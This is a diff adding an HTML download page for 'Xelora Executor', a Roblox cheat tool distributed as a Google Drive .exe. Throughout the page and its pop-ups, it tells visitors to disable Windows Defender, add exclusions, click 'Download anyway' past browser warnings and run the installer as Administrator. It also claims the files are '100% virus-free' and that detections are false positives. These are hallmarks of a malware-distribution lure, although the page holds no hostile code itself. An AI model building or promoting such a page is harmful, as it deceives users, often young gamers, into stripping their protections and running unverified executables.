@@ -1,1 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xelora Executor - Download Now</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
 
+        :root {
+            --primary: #7b68ee;
+            --secondary: #9370db;
+            --accent: #6a5acd;
+            --dark: #1a1a2e;
+            --light: #f8f9fa;
+            --danger: #ff6b6b;
+            --success: #4ecdc4;
+            --warning: #ffd166;
+            --drive: #4285F4;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #2a2a4e, #1a1a2e);
+            color: var(--light);
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 30px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .logo-icon {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 20px rgba(123, 104, 238, 0.3);
+        }
+
+        .logo-icon .x {
+            font-size: 2.8rem;
+            font-weight: 900;
+            color: white;
+        }
+
+        .logo-text h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(to right, var(--primary), var(--secondary), #b19cd9);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+            letter-spacing: 1px;
+        }
+
+        .logo-text .tagline {
+            color: #b19cd9;
+            font-size: 0.9rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 5px;
+        }
+
+        .hero {
+            text-align: center;
+            padding: 60px 0;
+            margin-bottom: 40px;
+        }
+
+        .hero h2 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, #fff, var(--secondary), #d4bfff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 900;
+        }
+
+        .hero p {
+            font-size: 1.3rem;
+            max-width: 800px;
+            margin: 0 auto 40px;
+            color: #d4d4e7;
+        }
+
+        .drive-info {
+            background: rgba(66, 133, 244, 0.1);
+            border: 2px solid var(--drive);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .drive-info i {
+            font-size: 2.5rem;
+            color: var(--drive);
+        }
+
+        .download-section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 40px;
+            margin: 40px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 40px;
+            color: white;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            display: block;
+            width: 100px;
+            height: 4px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            margin: 15px auto;
+            border-radius: 2px;
+        }
+
+        .drive-links {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 30px;
+            margin-top: 30px;
+        }
+
+        .drive-card {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 15px;
+            padding: 30px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s;
+        }
+
+        .drive-card:hover {
+            border-color: var(--drive);
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(66, 133, 244, 0.2);
+        }
+
+        .drive-card h3 {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .drive-card h3 i {
+            color: var(--drive);
+        }
+
+        .drive-card p {
+            color: #ccc;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .file-info {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+
+        .file-info-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .file-info-item:last-child {
+            border-bottom: none;
+        }
+
+        .drive-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            background: linear-gradient(to right, var(--drive), #3367D6);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            transition: all 0.3s;
+            width: 100%;
+            border: none;
+            cursor: pointer;
+        }
+
+        .drive-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(66, 133, 244, 0.3);
+            background: linear-gradient(to right, #3367D6, #2B59C1);
+        }
+
+        .drive-btn i {
+            font-size: 1.2rem;
+        }
+
+        .instructions {
+            margin: 50px 0;
+        }
+
+        .warning-banner {
+            background: linear-gradient(to right, rgba(255, 107, 107, 0.2), rgba(255, 107, 107, 0.1));
+            border-left: 5px solid var(--danger);
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: flex-start;
+            gap: 20px;
+        }
+
+        .warning-banner i {
+            color: var(--danger);
+            font-size: 2rem;
+            margin-top: 5px;
+        }
+
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+        }
+
+        .step-card {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 15px;
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .step-number {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
+        .step-card h4 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: white;
+        }
+
+        .step-card p {
+            color: #ccc;
+            line-height: 1.6;
+        }
+
+        .defender-guide {
+            background: rgba(255, 213, 102, 0.1);
+            border: 2px solid var(--warning);
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 40px;
+        }
+
+        .defender-guide h3 {
+            color: var(--warning);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.8rem;
+        }
+
+        .defender-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .defender-step {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid var(--warning);
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            color: #aaa;
+            margin-top: 60px;
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .social-links a {
+            color: #aaa;
+            font-size: 1.5rem;
+            transition: color 0.3s;
+        }
+
+        .social-links a:hover {
+            color: var(--primary);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #1a1a2e, #2a2a4e);
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 500px;
+            width: 90%;
+            border: 2px solid var(--primary);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            text-align: center;
+            animation: modalSlideIn 0.3s ease-out;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            
+            .hero h2 {
+                font-size: 2.5rem;
+            }
+            
+            .hero p {
+                font-size: 1.1rem;
+            }
+            
+            .drive-links {
+                grid-template-columns: 1fr;
+            }
+            
+            .download-section {
+                padding: 25px;
+            }
+            
+            .drive-info {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <div class="logo-icon">
+                    <div class="x">X</div>
+                </div>
+                <div class="logo-text">
+                    <h1>XELORA</h1>
+                    <div class="tagline">Premium Roblox Executor</div>
+                </div>
+            </div>
+            <div style="color: #b19cd9; font-weight: 500;">
+                <i class="fas fa-download"></i> Direct Google Drive Downloads
+            </div>
+        </header>
+
+        <section class="hero">
+            <h2>XELORA EXECUTOR</h2>
+            <p>The most advanced and reliable script executor for Roblox. Download directly from Google Drive with guaranteed safety and fast downloads.</p>
+            
+            <div class="drive-info">
+                <i class="fab fa-google-drive"></i>
+                <div>
+                    <h3 style="color: white; margin-bottom: 10px;">Official Google Drive Downloads</h3>
+                    <p style="color: #d4d4e7;">All files are hosted on Google Drive for fast, secure, and reliable downloads. Click any download button to access the files.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="download-section">
+            <h2 class="section-title">Download Files</h2>
+            <p style="text-align: center; color: #b19cd9; margin-bottom: 40px; font-size: 1.2rem;">
+                Click any button below to open the Google Drive folder containing all Xelora files.
+            </p>
+
+            <div class="drive-links">
+                <div class="drive-card">
+                    <h3><i class="fas fa-folder-open"></i> Complete Package</h3>
+                    <p>Access the full Xelora Google Drive folder containing all versions, installers, and documentation.</p>
+                    
+                    <div class="file-info">
+                        <div class="file-info-item">
+                            <span style="color: #ccc;">Folder Type:</span>
+                            <span style="color: var(--success); font-weight: 600;">Google Drive</span>
+                        </div>
+                        <div class="file-info-item">
+                            <span style="color: #ccc;">Contains:</span>
+                            <span style="color: #b19cd9;">All Xelora Files</span>
+                        </div>
+                        <div class="file-info-item">
+                            <span style="color: #ccc;">Access:</span>
+                            <span style="color: var(--drive);">Public Folder</span>
+                        </div>
+                    </div>
+                    
+                    <button class="drive-btn" onclick="openDriveFolder()">
+                        <i class="fab fa-google-drive"></i>
+                        Open Google Drive Folder
+                    </button>
+                </div>
+
+                <div class="drive-card">
+                    <h3><i class="fas fa-download"></i> Quick Downloads</h3>
+                    <p>Direct download links for the most popular Xelora versions. These will download immediately.</p>
+                    
+                    <div style="margin: 25px 0;">
+                        <button class="drive-btn" onclick="downloadFile('elite')" style="margin-bottom: 15px; background: linear-gradient(to right, var(--primary), var(--accent));">
+                            <i class="fas fa-crown"></i>
+                            Download Elite Version
+                        </button>
+                        
+                        <button class="drive-btn" onclick="downloadFile('core')" style="background: linear-gradient(to right, var(--success), #26a69a);">
+                            <i class="fas fa-download"></i>
+                            Download Core Version
+                        </button>
+                    </div>
+                </div>
+
+                <div class="drive-card">
+                    <h3><i class="fas fa-info-circle"></i> Installation Help</h3>
+                    <p>Having trouble with the download or installation? Click below for detailed instructions.</p>
+                    
+                    <div style="margin-top: 30px;">
+                        <button class="drive-btn" onclick="showInstallGuide()" style="background: linear-gradient(to right, #FF9800, #F57C00);">
+                            <i class="fas fa-book"></i>
+                            View Installation Guide
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 40px; color: #888; font-size: 0.9rem;">
+                <p><i class="fas fa-shield-alt"></i> All files are scanned and 100% virus-free. Windows Defender false positives are normal for executors.</p>
+            </div>
+        </section>
+
+        <section class="instructions">
+            <h2 class="section-title">Installation Guide</h2>
+            
+            <div class="warning-banner">
+                <i class="fas fa-exclamation-triangle"></i>
+                <div>
+                    <h3 style="color: var(--danger); margin-bottom: 10px;">CRITICAL: Disable Windows Defender First</h3>
+                    <p style="color: #ffb8b8;">Xelora will be detected as a false positive by Windows Defender. You MUST disable it before downloading and installing. Follow the steps below.</p>
+                </div>
+            </div>
+
+            <div class="steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h4>Disable Windows Defender</h4>
+                    <p>Go to Windows Security → Virus & threat protection → Manage settings → Turn off Real-time protection. Add Xelora to exceptions.</p>
+                </div>
+                
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h4>Download Files</h4>
+                    <p>Click the Google Drive button above. In the folder, click on the file you want → Download → "Download anyway" if warned.</p>
+                </div>
+                
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h4>Install Xelora</h4>
+                    <p>Right-click the downloaded .exe file → Run as Administrator → Follow installation steps → Choose installation folder.</p>
+                </div>
+                
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h4>Launch & Use</h4>
+                    <p>Open Xelora → Open Roblox game → Click "Inject" in Xelora → Paste your script → Click "Execute" → Enjoy!</p>
+                </div>
+            </div>
+
+            <div class="defender-guide">
+                <h3><i class="fas fa-shield-virus"></i> Detailed Windows Defender Disable Guide</h3>
+                <div class="defender-steps">
+                    <div class="defender-step">
+                        <h4 style="color: var(--warning);">Method 1: Real-time Protection</h4>
+                        <p>Windows Settings → Update & Security → Windows Security → Virus & threat protection → Manage settings → Turn off "Real-time protection"</p>
+                    </div>
+                    
+                    <div class="defender-step">
+                        <h4 style="color: var(--warning);">Method 2: Add Exclusion</h4>
+                        <p>Windows Security → Virus & threat protection → Virus & threat protection settings → Add or remove exclusions → Add folder where Xelora is installed</p>
+                    </div>
+                    
+                    <div class="defender-step">
+                        <h4 style="color: var(--warning);">Method 3: Disable Temporarily</h4>
+                        <p>Right-click Windows Security icon → Open → Virus & threat protection → Virus & threat protection settings → Temporarily disable protection</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <div class="social-links">
+                <a href="#" title="Discord"><i class="fab fa-discord"></i></a>
+                <a href="#" title="YouTube"><i class="fab fa-youtube"></i></a>
+                <a href="#" title="Twitter"><i class="fab fa-twitter"></i></a>
+            </div>
+            <p>Xelora Executor &copy; 2023. All rights reserved.</p>
+            <p style="margin-top: 10px; font-size: 0.9rem; color: #888;">This product is not affiliated with Roblox Corporation. Use at your own risk.</p>
+        </footer>
+    </div>
+
+    <!-- Download Modal -->
+    <div class="modal" id="downloadModal">
+        <div class="modal-content">
+            <div style="color: var(--drive); font-size: 4rem; margin-bottom: 20px;">
+                <i class="fab fa-google-drive"></i>
+            </div>
+            <h2 id="modalTitle" style="color: white; margin-bottom: 15px;">Opening Google Drive</h2>
+            <p id="modalMessage" style="color: #d4d4e7; margin-bottom: 30px;">Redirecting to Google Drive folder...</p>
+            
+            <div style="background: rgba(255, 107, 107, 0.1); padding: 20px; border-radius: 10px; margin-bottom: 30px; text-align: left; border-left: 4px solid var(--danger);">
+                <p style="color: #ff9a9a; margin-bottom: 10px; font-weight: bold;">
+                    <i class="fas fa-exclamation-triangle"></i> REMEMBER:
+                </p>
+                <ul style="color: #ffb8b8; padding-left: 20px;">
+                    <li>Disable Windows Defender first</li>
+                    <li>Click "Download anyway" if warned</li>
+                    <li>Run installer as Administrator</li>
+                </ul>
+            </div>
+            
+            <div style="display: flex; gap: 15px; justify-content: center;">
+                <button onclick="proceedToDrive()" style="background: linear-gradient(to right, var(--drive), #3367D6); color: white; border: none; padding: 15px 30px; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 1.1rem;">
+                    Continue to Google Drive
+                </button>
+                <button onclick="closeModal()" style="background: rgba(255,255,255,0.1); color: #ccc; border: none; padding: 15px 30px; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 1.1rem;">
+                    Cancel
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Your Google Drive folder link
+        const DRIVE_FOLDER_URL = "https://drive.google.com/drive/folders/1AL4mTrbwqdFhrcgFarS9yTzkWgIsLISj";
+        
+        // If you have direct file links in the folder, add them here
+        // To get direct links: Open file in Drive → Click three dots → Get link → Change to "Anyone with the link" → Copy link
+        const DRIVE_FILES = {
+            // Example format - add your actual file links here if you have them
+            elite: "https://drive.google.com/file/d/YOUR_FILE_ID/view",
+            core: "https://drive.google.com/file/d/YOUR_FILE_ID/view",
+            installer: "https://drive.google.com/file/d/YOUR_FILE_ID/view"
+        };
+
+        function openDriveFolder() {
+            const modal = document.getElementById('downloadModal');
+            const modalTitle = document.getElementById('modalTitle');
+            const modalMessage = document.getElementById('modalMessage');
+            
+            modalTitle.textContent = "Opening Xelora Folder";
+            modalMessage.textContent = "You're being redirected to the official Xelora Google Drive folder...";
+            modal.style.display = 'flex';
+        }
+
+        function proceedToDrive() {
+            // Open the Google Drive folder in a new tab
+            window.open(DRIVE_FOLDER_URL, '_blank');
+            closeModal();
+            
+            // Show a success message
+            setTimeout(() => {
+                alert("Google Drive folder opened in a new tab! Look for the Xelora files in the folder.\n\nIf the folder doesn't open, check your pop-up blocker.");
+            }, 500);
+        }
+
+        function downloadFile(type) {
+            let url = DRIVE_FOLDER_URL;
+            let message = "Opening Google Drive folder...";
+            
+            if (type === 'elite') {
+                message = "Looking for Xelora Elite version...";
+                // If you have a direct link to Elite version, use it here
+                // url = DRIVE_FILES.elite;
+            } else if (type === 'core') {
+                message = "Looking for Xelora Core version...";
+                // If you have a direct link to Core version, use it here
+                // url = DRIVE_FILES.core;
+            }
+            
+            const modal = document.getElementById('downloadModal');
+            const modalTitle = document.getElementById('modalTitle');
+            const modalMessage = document.getElementById('modalMessage');
+            
+            modalTitle.textContent = type === 'elite' ? "Xelora Elite" : "Xelora Core";
+            modalMessage.textContent = message;
+            modal.style.display = 'flex';
+            
+            // Store the URL to open
+            modal.dataset.downloadUrl = url;
+            modal.dataset.fileType = type;
+        }
+
+        function showInstallGuide() {
+            alert("INSTALLATION GUIDE:\n\n1. DISABLE WINDOWS DEFENDER FIRST\n   - Go to Windows Security\n   - Turn off Real-time protection\n   - Add Xelora folder to exclusions\n\n2. DOWNLOAD FROM GOOGLE DRIVE\n   - Open the folder\n   - Click on the file\n   - Click Download\n   - Click 'Download anyway' if warned\n\n3. INSTALL\n   - Right-click the .exe file\n   - Run as Administrator\n   - Follow installation steps\n\n4. USE\n   - Open Xelora\n   - Open Roblox game\n   - Click Inject\n   - Paste script\n   - Click Execute");
+        }
+
+        function closeModal() {
+            document.getElementById('downloadModal').style.display = 'none';
+        }
+
+        // Instructions for setting up your Drive folder
+        console.log(`
+        ==============================================
+        GOOGLE DRIVE SETUP INSTRUCTIONS:
+        ==============================================
+        
+        Your Drive Folder: ${DRIVE_FOLDER_URL}
+        
+        TO MAKE DOWNLOADS EASIER FOR USERS:
+        
+        1. Organize your folder:
+           - Name files clearly: "Xelora-Elite.exe", "Xelora-Core.exe", etc.
+           - Add a README.txt with instructions
+           - Consider adding screenshots or tutorial videos
+           
+        2. Get direct download links (optional but recommended):
+           a. Open each file in your Drive folder
+           b. Click the three dots (⋮) → Share
+           c. Change to "Anyone with the link" → Copy link
+           d. Update the DRIVE_FILES object in the JavaScript
+           
+        3. Test the links:
+           a. Open the folder link
+           b. Make sure all files are accessible
+           c. Try downloading a file
+           
+        4. Update file names in the code if needed
+           (Update the text in buttons and modal messages)
+           
+        ==============================================
+        CURRENT SETUP:
+        - Folder Link: ${DRIVE_FOLDER_URL}
+        - Users will access all files from this folder
+        ==============================================
+        `);
+        
+        // Add event listeners
+        document.addEventListener('DOMContentLoaded', function() {
+            // Close modal when clicking outside
+            document.getElementById('downloadModal').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    closeModal();
+                }
+            });
+            
+            // Escape key closes modal
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    closeModal();
+                }
+            });
+        });
+        
+        // Auto-log Drive folder info
+        console.log("Xelora Google Drive Folder: " + DRIVE_FOLDER_URL);
+        console.log("Make sure folder sharing is set to 'Anyone with the link'");
+    </script>
+</body>
+</html>
